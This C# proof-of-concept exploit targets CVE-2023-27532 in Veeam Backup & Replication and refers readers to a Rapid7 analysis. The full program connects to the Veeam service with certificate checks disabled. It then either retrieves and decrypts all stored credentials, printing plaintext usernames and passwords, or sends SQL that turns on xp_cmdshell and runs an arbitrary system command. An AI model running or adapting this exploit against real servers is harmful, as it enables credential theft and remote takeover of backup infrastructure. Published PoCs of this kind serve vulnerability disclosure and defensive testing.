// Proof of Concept code to exploit CVE-2023-27532 and either leak plaintext credentials or perform remote command execution.
// For a detailed analysis of the vulnerability and exploitation please read the Rapid7 AttackerKB Analysis: https://attackerkb.com/topics/ALUsuJioE5/cve-2023-27532/rapid7-analysis
using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.Serialization.Formatters.Binary;
using System.Security.Cryptography;
using System.ServiceModel;
using System.ServiceModel.Security;
using System.Text;
using Veeam.Backup.Core;
using Veeam.Backup.Interaction.MountService;
using Veeam.Backup.Model;

namespace VeeamHax
{
    internal class Program
    {
        static void Main(string[] args)
        {
            string host = "127.0.0.1";
            int port = 9401;
            bool verbose = false;
            string cmd = null;

            for (int i = 0; i < args.Length; i++)
            {
                if (args[i] == "--target" && i + 1 < args.Length)
                    host = args[i + 1];
                else if (args[i] == "--port" && i + 1 < args.Length)
                    port = Int32.Parse(args[i + 1]);
                else if (args[i] == "--verbose")
                    verbose = true;
                else if (args[i] == "--cmd" && i + 1 < args.Length)
                    cmd = args[i + 1];
                else if (args[i] == "--help" || args[i] == "-h" || args[i] == "/?")
                {
                    Console.WriteLine("Usage: VeeamHax.exe [--verbose] --target 192.168.0.1 --port 9401 [--cmd \"c:\\windows\\notepad.exe\"]");
                    return;
                }
            }

            Console.WriteLine("Targeting {0}:{1}", host, port);

            NetTcpBinding binding = new NetTcpBinding();

            NetTcpSecurity netTcpSecurity = new NetTcpSecurity();

            netTcpSecurity.Mode = SecurityMode.Transport;

            TcpTransportSecurity tcpTransportSecurity = new TcpTransportSecurity();

            tcpTransportSecurity.ClientCredentialType = TcpClientCredentialType.None;

            netTcpSecurity.Transport = tcpTransportSecurity;

            binding.Security = netTcpSecurity;

            binding.Name = "foo";

            Uri uri = new Uri(String.Format("net.tcp://{0}:{1}/", host, port));

            EndpointAddress endpoint = new EndpointAddress(uri, EndpointIdentity.CreateDnsIdentity("Veeam Backup Server Certificate"));

            ChannelFactory<IRemoteInvokeService> channelFactory = new ChannelFactory<IRemoteInvokeService>(binding, endpoint);

            X509ServiceCertificateAuthentication x509ServiceCertificateAuthentication = new X509ServiceCertificateAuthentication();

            x509ServiceCertificateAuthentication.CertificateValidationMode = X509CertificateValidationMode.None;

            channelFactory.Credentials.ServiceCertificate.SslCertificateAuthentication = x509ServiceCertificateAuthentication;

            IRemoteInvokeService channel = channelFactory.CreateChannel(endpoint);

            if (cmd != null)
            {
                // CommandType 1 == Text

                string spec = String.Format(
                    """
    <RemoteInvokeSpec ContextSessionId="{0}">
        <DbGetDataTableRemoteInvokeSpec>
            <SqlCommand>EXEC sp_configure 'show advanced options', 1; EXEC sp_configure reconfigure; EXEC sp_configure 'xp_cmdshell', 1; EXEC sp_configure reconfigure; EXEC xp_cmdshell '{1}';</SqlCommand>
            <CommandType>1</CommandType>
        </DbGetDataTableRemoteInvokeSpec>
    </RemoteInvokeSpec>
    """,
                    Guid.NewGuid().ToString(),
                    cmd
                );

                channel.GetDataTable(ERemoteInvokeScope.DatabaseAccessor, ERemoteInvokeMethod.GetDataTable, spec);
            }
            else
            {
                MemoryStream stream = new MemoryStream();

                BinaryFormatter formatter = new BinaryFormatter();

                formatter.Serialize(stream, true);

                string includeHidden = Convert.ToBase64String(stream.ToArray());

                string parameters = String.Format(
                    """
    <RemoteInvokeSpec ContextSessionId="{0}" Scope="Service" Method="CredentialsDbScopeGetAllCreds">
        <Params>
            <Param ParamName="includeHidden" ParamValue="{1}" ParamType="System.String"></Param>
        </Params>
    </RemoteInvokeSpec>
    """,
                    Guid.NewGuid().ToString(),
                    includeHidden
                );

                string xml_result = channel.Invoke(ERemoteInvokeScope.DatabaseManager, ERemoteInvokeMethod.CredentialsDbScopeGetAllCreds, parameters);

                if (verbose)
                {
                    Console.WriteLine("Dumping raw response:");
                    Console.WriteLine(xml_result);
                    Console.WriteLine("");
                }

                CCommonInvokeRetVal allCreds2 = CCommonInvokeRetVal.Deserialize(xml_result);

                string retVal = allCreds2.GetParamAsString("retVal");

                List<CDbCredentialsInfo> result = CProxyBinaryFormatter.Deserialize<List<CDbCredentialsInfo>>(retVal);

                foreach (CDbCredentialsInfo info in result)
                {
                    byte[] password_raw;

                    // password is now 'encrypted' using Crypt32!CryptProtectData from our local machine, which occurred during deserialization above.
                    // so we can unprotect it here to get back the plaintext. 
                    if (info.Credentials.IsLocalProtect)
                        password_raw = ProtectedData.Unprotect(Convert.FromBase64String(info.Credentials.EncryptedPassword.Value), (byte[])null, (DataProtectionScope)1);
                    else
                        password_raw = ProtectedData.Unprotect(Convert.FromBase64String(info.Credentials.EncryptedPassword.Value), (byte[])null, (DataProtectionScope)0);

                    string password = Encoding.UTF8.GetString(password_raw);

                    Console.WriteLine("User: {0}\nID: {1}\nPassword: {2}\n", info.Credentials.Name, info.Id, password);
                }
            }
        }
    }
}
